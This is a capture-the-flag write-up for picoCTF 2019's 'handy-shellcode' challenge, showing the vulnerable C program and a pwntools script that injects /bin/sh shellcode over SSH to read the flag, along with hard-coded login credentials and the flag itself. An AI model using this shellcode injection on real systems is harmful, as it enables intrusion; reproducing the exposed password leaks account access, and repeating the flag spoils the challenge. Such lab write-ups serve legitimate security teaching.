# Problem
This [program](https://2019shell1.picoctf.com/static/60f2c9fc4aa125e85132fe694eff65d8/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server. [Source](https://2019shell1.picoctf.com/static/60f2c9fc4aa125e85132fe694eff65d8/vuln.c).

## Hints:
You might be able to find some good shellcode online.

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/60f2c9fc4aa125e85132fe694eff65d8/vuln
wget https://2019shell1.picoctf.com/static/60f2c9fc4aa125e85132fe694eff65d8/vuln.c
```

First, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

The function ```vuln()``` just reads the buffer from the input, and after that, ```main()``` will execute the buffer.

All we need to do is the send a [shellcode](https://en.wikipedia.org/wiki/Shellcode) to the program.

We can get a shellcode from [shell-storm](http://shell-storm.org/shellcode/), or use those from [pwntools](https://github.com/Gallopsled/pwntools)

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6')
  p = s.process('./vuln')

print p.recv()
log.info('Sending shellcode: {}'.format(asm(shellcraft.i386.linux.sh())))
p.sendline(asm(shellcraft.i386.linux.sh()))

if debug:
  p.interactive()
else:
  p.sendline('ls')
  p.sendline('cat flag.txt')
  p.sendline('exit')

  print p.recvall()
```

Flag: picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}